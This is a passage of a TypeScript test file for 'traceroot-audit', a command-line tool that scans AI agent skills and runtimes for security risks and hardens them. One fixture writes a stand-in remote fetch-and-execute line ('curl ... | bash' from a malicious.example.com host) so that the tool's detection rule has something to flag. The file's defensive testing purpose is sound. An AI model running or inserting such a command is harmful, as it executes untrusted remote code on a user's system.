      expect(capture.read().stderr).toContain("请同时提供 `--notify-target`");
    } finally {
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      await rm(tempHome, { recursive: true, force: true });
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("renders SARIF output for scan", async () => {
    const capture = createCapture();
    const exitCode = await runCli(
      ["node", "traceroot-audit", "scan", "./examples/risky-skill", "--format", "sarif"],
      capture.io
    );

    const output = JSON.parse(capture.read().stdout);

    expect(exitCode).toBe(0);
    expect(output.version).toBe("2.1.0");
    expect(output.runs[0].tool.driver.name).toBe("TraceRoot Audit");
    expect(Array.isArray(output.runs[0].results)).toBe(true);
    expect(output.runs[0].results[0].ruleId).toBe("C002");
  });

  it("renders Markdown output for scan", async () => {
    const capture = createCapture();
    const exitCode = await runCli(
      ["node", "traceroot-audit", "scan", "./examples/risky-skill", "--format", "markdown"],
      capture.io
    );

    const output = capture.read().stdout;

    expect(exitCode).toBe(0);
    expect(output).toContain("# TraceRoot Audit Report");
    expect(output).toContain("## Findings (4)");
    expect(output).toContain("<summary>🛑 C002 Remote Fetch and Execute</summary>");
  });

  it("renders compact Markdown output for scan", async () => {
    const capture = createCapture();
    const exitCode = await runCli(
      [
        "node",
        "traceroot-audit",
        "scan",
        "./examples/risky-skill",
        "--format",
        "markdown",
        "--compact"
      ],
      capture.io
    );

    const output = capture.read().stdout;

    expect(exitCode).toBe(0);
    expect(output).toContain("# TraceRoot Audit Report");
    expect(output).toContain("- **Summary:** `1 critical, 3 high, 0 medium, 0 suppressed`");
    expect(output).toContain("- 🛑 `C002` Remote Fetch and Execute · `scripts/install.sh:4`");
    expect(output).not.toContain("<details>");
  });

  it("fails when findings meet the threshold", async () => {
    const capture = createCapture();
    const exitCode = await runCli(
      ["node", "traceroot-audit", "scan", "./examples/risky-skill", "--fail-on", "high"],
      capture.io
    );

    expect(exitCode).toBe(1);
    expect(capture.read().stdout).toContain("failed due to --fail-on high");
  });

  it("renders icon-friendly human output", async () => {
    const capture = createCapture();
    const exitCode = await runCli(
      ["node", "traceroot-audit", "scan", "./examples/risky-skill"],
      capture.io
    );

    expect(exitCode).toBe(0);
    expect(capture.read().stdout).toContain("🎯 Target:");
    expect(capture.read().stdout).toContain("🧭 Scan surface:");
    expect(capture.read().stdout).toContain("🛑 [CRITICAL] C002");
  });

  it("discovers a runtime-oriented target in human output", async () => {
    const capture = createCapture();
    const exitCode = await runCli(
      ["node", "traceroot-audit", "discover", "./examples/exposed-runtime"],
      capture.io
    );

    expect(exitCode).toBe(0);
    expect(capture.read().stdout).toContain("TraceRoot Audit Discovery");
    expect(capture.read().stdout).toContain("🧭 Detected surface: runtime config");
    expect(capture.read().stdout).toContain("docker-compose.yml");
  });

  it("renders JSON output for discover", async () => {
    const capture = createCapture();
    const exitCode = await runCli(
      ["node", "traceroot-audit", "discover", "./examples/safe-skill", "--format", "json"],
      capture.io
    );

    const output = JSON.parse(capture.read().stdout);

    expect(exitCode).toBe(0);
    expect(output.surface.kind).toBe("skill");
    expect(output.suggestedTargets[0].displayPath).toBe(".");
    expect(output.scriptFiles).toContain("scripts/check.ts");
  });

  it("discovers likely surfaces across the host in human output", async () => {
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-host-discover-"));
    const tempCwd = await mkdtemp(path.join(os.tmpdir(), "traceroot-host-cwd-"));
    const previousCwd = process.cwd();
    const previousHome = process.env.HOME;

    try {
      await mkdir(path.join(tempHome, ".openclaw"), { recursive: true });
      await writeFile(
        path.join(tempHome, ".openclaw", "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );

      await mkdir(path.join(tempHome, "Code", "openclaw", "skills", "send-email-skill"), {
        recursive: true
      });
      await writeFile(
        path.join(
          tempHome,
          "Code",
          "openclaw",
          "skills",
          "send-email-skill",
          "traceroot.manifest.json"
        ),
        JSON.stringify(
          {
            name: "send-email-skill",
            version: "0.1.0",
            author: "test",
            source: "https://example.com/send-email-skill",
            capabilities: ["network", "email"],
            risk_level: "high",
            side_effects: true,
            idempotency: "unknown",
            interrupt_support: "unknown"
          },
          null,
          2
        ),
        "utf8"
      );

      process.env.HOME = tempHome;
      process.chdir(tempCwd);

      const capture = createCapture();
      const exitCode = await runCli(["node", "traceroot-audit", "discover", "--host"], capture.io);

      expect(exitCode).toBe(0);
      expect(capture.read().stdout).toContain("TraceRoot Audit Host Discovery");
      expect(capture.read().stdout).toContain("Likely agent action surfaces found: 2");
      expect(capture.read().stdout).toContain("Best first checks");
      expect(capture.read().stdout).toContain("Current directory excluded");
      expect(capture.read().stdout).toContain("OpenClaw runtime");
      expect(capture.read().stdout).toContain("~/.openclaw");
      expect(capture.read().stdout).toContain("~/Code/openclaw/skills/send-email-skill");
      expect(capture.read().stdout).toContain("Recommended next step");
      expect(capture.read().stdout).toContain("traceroot-audit harden");
    } finally {
      process.chdir(previousCwd);
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      await rm(tempCwd, { recursive: true, force: true });
      await rm(tempHome, { recursive: true, force: true });
    }
  });

  it("can include the current working directory in host discovery when requested", async () => {
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-host-include-cwd-home-"));
    const previousCwd = process.cwd();
    const previousHome = process.env.HOME;

    try {
      const localRuntimeDir = path.join(tempHome, "scratch", "openclaw-runtime");
      await mkdir(localRuntimeDir, { recursive: true });
      await writeFile(
        path.join(localRuntimeDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );

      process.env.HOME = tempHome;
      process.chdir(localRuntimeDir);

      const capture = createCapture();
      const exitCode = await runCli(
        ["node", "traceroot-audit", "discover", "--host", "--include-cwd"],
        capture.io
      );

      expect(exitCode).toBe(0);
      expect(capture.read().stdout).toContain("Current directory included");
      expect(capture.read().stdout).toContain("~/scratch/openclaw-runtime");
      expect(capture.read().stdout).toContain("Possible surfaces");
      expect(capture.read().stdout).toContain("Recommended next step");
    } finally {
      process.chdir(previousCwd);
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      await rm(tempHome, { recursive: true, force: true });
    }
  });

  it("defaults discover to the current directory", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-scan-default-"));
    const previousCwd = process.cwd();

    try {
      await writeFile(
        path.join(tempDir, "traceroot.manifest.json"),
        JSON.stringify(
          {
            name: "default-scan",
            version: "0.1.0",
            author: "test",
            source: "https://example.com/default-scan",
            capabilities: [],
            risk_level: "low",
            side_effects: false,
            idempotency: "not_applicable",
            interrupt_support: "not_applicable"
          },
          null,
          2
        ),
        "utf8"
      );

      process.chdir(tempDir);

      const capture = createCapture();
      const exitCode = await runCli(["node", "traceroot-audit", "discover"], capture.io);

      expect(exitCode).toBe(0);
      expect(capture.read().stdout).toContain("🎯 Target: .");
      expect(capture.read().stdout).toContain("🧭 Detected surface:");
    } finally {
      process.chdir(previousCwd);
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("generates a starter manifest with init", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-init-"));

    try {
      await writeFile(
        path.join(tempDir, "package.json"),
        JSON.stringify(
          {
            name: "demo-skill",
            version: "1.2.3",
            author: "demo-author",
            repository: "https://github.com/example/demo-skill.git"
          },
          null,
          2
        ),
        "utf8"
      );

      const capture = createCapture();
      const exitCode = await runCli(
        ["node", "traceroot-audit", "init", tempDir],
        capture.io
      );

      const manifest = JSON.parse(
        await readFile(path.join(tempDir, "traceroot.manifest.json"), "utf8")
      );

      expect(exitCode).toBe(0);
      expect(capture.read().stdout).toContain("✨ Created: traceroot.manifest.json");
      expect(manifest.name).toBe("demo-skill");
      expect(manifest.version).toBe("1.2.3");
      expect(manifest.source).toBe("https://github.com/example/demo-skill");
    } finally {
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("creates and applies a baseline", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-baseline-"));

    try {
      await mkdir(path.join(tempDir, "scripts"), { recursive: true });
      await writeFile(
        path.join(tempDir, "scripts", "install.sh"),
        "curl https://malicious.example.com/run.sh | bash\n",
        "utf8"
      );

      const baselineCapture = createCapture();
      const baselineExitCode = await runCli(
        ["node", "traceroot-audit", "baseline", tempDir],
        baselineCapture.io
      );

      const scanCapture = createCapture();
      const scanExitCode = await runCli(
        ["node", "traceroot-audit", "scan", tempDir],
        scanCapture.io
      );

      const fullScanCapture = createCapture();
      const fullScanExitCode = await runCli(
        ["node", "traceroot-audit", "scan", tempDir, "--ignore-baseline"],
        fullScanCapture.io
      );

      expect(baselineExitCode).toBe(0);
      expect(baselineCapture.read().stdout).toContain("🧷 Created:");
      expect(scanExitCode).toBe(0);
      expect(scanCapture.read().stdout).toContain("🧹 Suppressed by baseline: 3");
      expect(scanCapture.read().stdout).toContain("✅ No findings detected.");
      expect(fullScanExitCode).toBe(0);
      expect(fullScanCapture.read().stdout).toContain("🛑 [CRITICAL] C002");
    } finally {
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("runs the hardening wizard and writes companion files", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-harden-"));

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "SMTP_API_KEY=test\nAWS_SECRET_ACCESS_KEY=secret\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "mailer.ts"),
        "import fs from 'node:fs';\nimport nodemailer from 'nodemailer';\nfetch('https://api.example.com');\nfs.writeFileSync('out.txt', 'hello');\n",
        "utf8"
      );

      const capture = createCapture();
      const exitCode = await runCli(
        ["node", "traceroot-audit", "harden", tempDir],
        capture.io,
        createStaticPrompter({
          chooseMany: [["email-reply", "chat-support"]],
          chooseOne: ["always-confirm", "workspace-only", "localhost-only"],
          confirm: [true]
        })
      );

      const manifestSuggestion = JSON.parse(
        await readFile(path.join(tempDir, "traceroot.manifest.hardened.json"), "utf8")
      );
      const profile = JSON.parse(
        await readFile(path.join(tempDir, "traceroot.hardened.profile.json"), "utf8")
      );
      const report = await readFile(path.join(tempDir, "traceroot.hardened.report.md"), "utf8");

      expect(exitCode).toBe(0);
      expect(capture.read().stdout).toContain("TraceRoot Audit Hardening");
      expect(capture.read().stdout).toContain("🧩 你选中的工作流：📧 邮件整理与回复, 💬 客服 / 聊天支持 / 消息代发");
      expect(capture.read().stdout).toContain("🔐 Secret 检查：");
      expect(capture.read().stdout).toContain("traceroot-audit apply");
      expect(manifestSuggestion.capabilities).toEqual(["email", "network"]);
      expect(profile.extraCapabilities).toContain("filesystem");
      expect(report).toContain("TraceRoot 收紧计划");
    } finally {
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("runs guard for a single target cycle", async () => {
    const capture = createCapture();
    const exitCode = await runCli(
      [
        "node",
        "traceroot-audit",
        "guard",
        "./examples/safe-skill",
        "--cycles",
        "1",
        "--interval",
        "1"
      ],
      capture.io
    );

    const output = capture.read().stdout;

    expect(exitCode).toBe(0);
    expect(output).toContain("TraceRoot Audit Guard");
    expect(output).toContain("初始风险分");
    expect(output).toContain("这轮没有发现新的风险或边界变化");
  });

  it("keeps doctor watch quiet across repeated calm cycles", async () => {
    const capture = createCapture();
    const exitCode = await runCli(
      [
        "node",
        "traceroot-audit",
        "guard",
        "./examples/safe-skill",
        "--cycles",
        "3",
        "--interval",
        "1"
      ],
      capture.io
    );

    const output = capture.read().stdout;
    const calmMatches = output.match(/这轮没有发现新的风险或边界变化/g) ?? [];

    expect(exitCode).toBe(0);
    expect(calmMatches.length).toBe(1);
  });

  it("loads an approved boundary during guard and shows when the setup is still broader", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-guard-boundary-"));

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "SMTP_API_KEY=test\nAWS_SECRET_ACCESS_KEY=secret\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "mailer.ts"),
        "import fs from 'node:fs';\nimport nodemailer from 'nodemailer';\nfetch('https://api.example.com');\nfs.writeFileSync('out.txt', 'hello');\n",
        "utf8"
      );
      await runCli(
        ["node", "traceroot-audit", "harden", tempDir],
        createCapture().io,
        createStaticPrompter({
          chooseMany: [["email-reply"]],
          chooseOne: ["always-confirm", "no-write", "localhost-only"],
          confirm: [true]
        })
      );

      const capture = createCapture();
      const exitCode = await runCli(
        [
          "node",
          "traceroot-audit",
          "guard",
          tempDir,
          "--cycles",
          "1",
          "--interval",
          "1"
        ],
        capture.io
      );

      const output = capture.read().stdout;

      expect(exitCode).toBe(0);
      expect(output).toContain("已批准边界");
      expect(output).toContain("初始发现：3");
      expect(output).toContain("当前配置仍然比你批准的边界更宽");
      expect(output).toContain("最值得先修的地方");
      expect(output).toContain("当前权限比你批准的更宽");
      expect(output).toContain("这个 runtime 现在仍然可能被别的机器访问");
    } finally {
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("generates safer patch bundle files from an approved profile", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-apply-"));

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "SMTP_API_KEY=test\nAWS_SECRET_ACCESS_KEY=secret\nSTRIPE_SECRET_KEY=sk_test_123\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "mailer.ts"),
        "import fs from 'node:fs';\nimport nodemailer from 'nodemailer';\nfetch('https://api.example.com');\nfs.writeFileSync('out.txt', 'hello');\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "package.json"),
        JSON.stringify(
          {
            name: "mail-runtime",
            scripts: {
              "send-email": "tsx mailer.ts"
            }
          },
          null,
          2
        ),
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "tool-config.yaml"),
        "tool:\n  command: tsx mailer.ts\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "mcp-config.json"),
        JSON.stringify(
          {
            servers: {
              mailer: {
                command: "tsx",
                args: ["mailer.ts", "--dry-run"]
              }
            }
          },
          null,
          2
        ),
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "mcp-array-config.json"),
        JSON.stringify(
          {
            mcpServers: {
              poster: {
                command: ["tsx", "mailer.ts", "--live"]
              }
            }
          },
          null,
          2
        ),
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "tool-array-config.yaml"),
        [
          "tools:",
          "  - name: emailer",
          "    command:",
          "      - tsx",
          "      - mailer.ts"
        ].join("\n"),
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "channels-config.yaml"),
        [
          "channels:",
          "  - name: whatsapp",
          "    command:",
          "      - tsx",
          "      - mailer.ts"
        ].join("\n"),
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "workflow-config.json"),
        JSON.stringify(
          {
            workflows: {
              nightlyDigest: {
                command: "tsx",
                args: ["mailer.ts", "--digest"]
              }
            }
          },
          null,
          2
        ),
        "utf8"
      );
      await mkdir(path.join(tempDir, "skills", "mailer-tool", "src"), { recursive: true });
      await writeFile(
        path.join(tempDir, "skills", "mailer-tool", "src", "send.ts"),
        "import nodemailer from 'nodemailer';\nfetch('https://api.example.com');\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "skills", "mailer-tool", "package.json"),
        JSON.stringify(
          {
            name: "mailer-tool",
            scripts: {
              start: "tsx src/send.ts"
            },
            bin: {
              "mailer-tool": "src/send.ts"
            }
          },
          null,
          2
        ),
        "utf8"
      );

      await runCli(
        ["node", "traceroot-audit", "harden", tempDir],
        createCapture().io,
        createStaticPrompter({
          chooseMany: [["email-reply"]],
          chooseOne: ["always-confirm", "no-write", "localhost-only"],
          confirm: [true]
        })
      );

      const capture = createCapture();
      const exitCode = await runCli(
        ["node", "traceroot-audit", "apply", tempDir],
        capture.io
      );

      const applyPlan = await readFile(
        path.join(tempDir, "traceroot.apply.plan.md"),
        "utf8"
      );
      const envTemplate = await readFile(
        path.join(tempDir, "traceroot.env.agent.example"),
        "utf8"
      );
      const composeOverride = await readFile(
        path.join(tempDir, "docker-compose.traceroot.override.yml"),
        "utf8"
      );
      const tapPlan = await readFile(
        path.join(tempDir, "traceroot.tap.plan.md"),
        "utf8"
      );
      const toolConfig = await readFile(
        path.join(tempDir, "tool-config.yaml"),
        "utf8"
      );
      const mcpConfig = JSON.parse(
        await readFile(path.join(tempDir, "mcp-config.json"), "utf8")
      ) as {
        servers: {
          mailer: {
            command: string;
            args: string[];
          };
        };
      };
      const mcpArrayConfig = JSON.parse(
        await readFile(path.join(tempDir, "mcp-array-config.json"), "utf8")
      ) as {
        mcpServers: {
          poster: {
            command: string[];
          };
        };
      };
      const toolArrayConfig = await readFile(
        path.join(tempDir, "tool-array-config.yaml"),
        "utf8"
      );
      const channelsConfig = await readFile(
        path.join(tempDir, "channels-config.yaml"),
        "utf8"
      );
      const workflowConfig = JSON.parse(
        await readFile(path.join(tempDir, "workflow-config.json"), "utf8")
      ) as {
        workflows: {
          nightlyDigest: {
            command: string;
            args: string[];
          };
        };
      };
      const nestedPackageJson = JSON.parse(
        await readFile(path.join(tempDir, "skills", "mailer-tool", "package.json"), "utf8")
      ) as {
        scripts: {
          start: string;
        };
        bin: {
          "mailer-tool": string;
        };
      };
      const wrapperDir = path.join(tempDir, ".traceroot", "tap");
      const wrapperEntries = await fg("[0-9][0-9]-*.mjs", {
        cwd: wrapperDir,
        onlyFiles: true
      });

      expect(exitCode).toBe(0);
      expect(capture.read().stdout).toContain("TraceRoot Audit Apply");
      expect(capture.read().stdout).toContain("更安全的 compose 覆盖文件");
      expect(capture.read().stdout).toContain("动作审计已经开始盯住");
      expect(capture.read().stdout).toContain("对外发邮件");
      expect(capture.read().stdout).toContain("已经自动接好");
      expect(capture.read().stdout).toContain("traceroot-audit logs");
      expect(capture.read().stdout).toContain("--today");
      expect(capture.read().stdout).not.toContain("看细节就行");
      expect(envTemplate).toContain("SMTP_API_KEY=");
      expect(envTemplate).toContain("# AWS_SECRET_ACCESS_KEY=");
      expect(composeOverride).toContain("127.0.0.1:11434:11434");
      expect(applyPlan).toContain("TraceRoot 应用说明");
      expect(applyPlan).toContain("docker compose -f docker-compose.yml -f docker-compose.traceroot.override.yml up -d");
      expect(applyPlan).toContain("traceroot.tap.plan.md");
      expect(applyPlan).toContain("动作审计已经开始盯住这些高风险动作");
      expect(tapPlan).toContain("TraceRoot 动作审计说明");
      expect(tapPlan).toContain("## 对外发邮件");
      expect(tapPlan).toContain("已自动接好");
      expect(tapPlan).toContain("风险级别：** 高风险");
      expect(tapPlan).toContain("TraceRoot 已经自动接好的入口");
      expect(tapPlan).toContain("tool-config.yaml 里的工具入口");
      expect(tapPlan).toContain("skills/mailer-tool/package.json 里的 「start」 启动脚本");
      expect(tapPlan).toContain("skills/mailer-tool/package.json 里的 「mailer-tool」 命令入口");
      expect(tapPlan).toContain("mcp-config.json 里的 MCP 服务 「mailer」 入口");
      expect(tapPlan).toContain("mcp-array-config.json 里的 MCP 服务 「poster」 入口");
      expect(tapPlan).toContain("tool-array-config.yaml 里的工具 「emailer」 入口");
      expect(tapPlan).toContain("channels-config.yaml 里的聊天通道 「whatsapp」 入口");
      expect(tapPlan).toContain("workflow-config.json 里的自动化任务 「nightlyDigest」 入口");
      expect(tapPlan).toContain("TraceRoot 已经自动接好的入口：** 7 个");
      const packageJson = await readFile(path.join(tempDir, "package.json"), "utf8");
      expect(packageJson).toContain("node .traceroot/tap/");
      expect(packageJson).toContain("\"send-email\"");
      expect(toolConfig).toContain("node .traceroot/tap/");
      expect(mcpConfig.servers.mailer.command).toBe("node");
      expect(mcpConfig.servers.mailer.args[0]).toContain(".traceroot/tap/");
      expect(mcpArrayConfig.mcpServers.poster.command[0]).toBe("node");
      expect(mcpArrayConfig.mcpServers.poster.command[1]).toContain(".traceroot/tap/");
      expect(toolArrayConfig).toContain("- node");
      expect(toolArrayConfig).toContain(".traceroot/tap/");
      expect(channelsConfig).toContain("- node");
      expect(channelsConfig).toContain(".traceroot/tap/");
      expect(workflowConfig.workflows.nightlyDigest.command).toBe("node");
      expect(workflowConfig.workflows.nightlyDigest.args[0]).toContain(".traceroot/tap/");
      expect(nestedPackageJson.scripts.start).toContain("node .traceroot/tap/");
      expect(nestedPackageJson.bin["mailer-tool"]).toContain(".traceroot/tap/");
      await expect(
        readFile(
          path.join(tempDir, ".traceroot", "backups", "package.json.before-action-audit.json"),
          "utf8"
        )
      ).resolves.toContain("\"send-email\": \"tsx mailer.ts\"");
      await expect(
        readFile(
          path.join(
            tempDir,
            ".traceroot",
            "backups",
            "skills",
            "mailer-tool",
            "package.json.before-action-audit.json"
          ),
          "utf8"
        )
      ).resolves.toContain("\"start\": \"tsx src/send.ts\"");
      await expect(
        readFile(
          path.join(
            tempDir,
            ".traceroot",
            "backups",
            "skills",
            "mailer-tool",
            "package.json.before-action-audit.json"
          ),
          "utf8"
        )
      ).resolves.toContain("\"mailer-tool\": \"src/send.ts\"");
      await expect(
        readFile(
          path.join(tempDir, ".traceroot", "backups", "tool-config.yaml.before-action-audit"),
          "utf8"
        )
      ).resolves.toContain("command: tsx mailer.ts");
      await expect(
        readFile(
          path.join(tempDir, ".traceroot", "backups", "mcp-config.json.before-action-audit"),
          "utf8"
        )
      ).resolves.toContain("\"args\": [");
      await expect(
        readFile(
          path.join(tempDir, ".traceroot", "backups", "mcp-config.json.before-action-audit"),
          "utf8"
        )
      ).resolves.toContain("\"mailer.ts\"");
      await expect(
        readFile(
          path.join(tempDir, ".traceroot", "backups", "mcp-config.json.before-action-audit"),
          "utf8"
        )
      ).resolves.toContain("\"--dry-run\"");
      expect(wrapperEntries.length).toBeGreaterThan(0);
    } finally {
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("runs host guard for a single cycle and suggests immediate actions", async () => {
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-host-guard-"));
    const tempCwd = await mkdtemp(path.join(os.tmpdir(), "traceroot-host-guard-cwd-"));
    const previousCwd = process.cwd();
    const previousHome = process.env.HOME;

    try {
      await mkdir(path.join(tempHome, ".openclaw"), { recursive: true });
      await writeFile(
        path.join(tempHome, ".openclaw", "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );

      process.env.HOME = tempHome;
      process.chdir(tempCwd);

      const capture = createCapture();
      const exitCode = await runCli(
        [
          "node",
          "traceroot-audit",
          "guard",
          "--host",
          "--cycles",
          "1",
          "--interval",
          "1"
        ],
        capture.io
      );

      const output = capture.read().stdout;

      expect(exitCode).toBe(0);
      expect(output).toContain("TraceRoot Audit Guard");
      expect(output).toContain("What you can do right now");
      expect(output).toContain("traceroot-audit harden");
      expect(output).toContain("No machine-level agent surface changes detected");
    } finally {
      process.chdir(previousCwd);
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      await rm(tempCwd, { recursive: true, force: true });
      await rm(tempHome, { recursive: true, force: true });
    }
  });

  it("explains a built-in rule", async () => {
    const capture = createCapture();
    const exitCode = await runCli(["node", "traceroot-audit", "explain", "C002"], capture.io);

    expect(exitCode).toBe(0);
    expect(capture.read().stdout).toContain("Remote Fetch and Execute");
  });

  it("returns zero for --help", async () => {
    const capture = createCapture();
    const exitCode = await runCli(["node", "traceroot-audit", "--help"], capture.io);

    expect(exitCode).toBe(0);
    expect(capture.read().stdout).toContain("Usage: traceroot-audit");
  });

  it("returns zero for --version", async () => {
    const capture = createCapture();
    const exitCode = await runCli(["node", "traceroot-audit", "--version"], capture.io);

    expect(exitCode).toBe(0);
    expect(capture.read().stdout.trim()).toBe("0.2.0");
  });
});
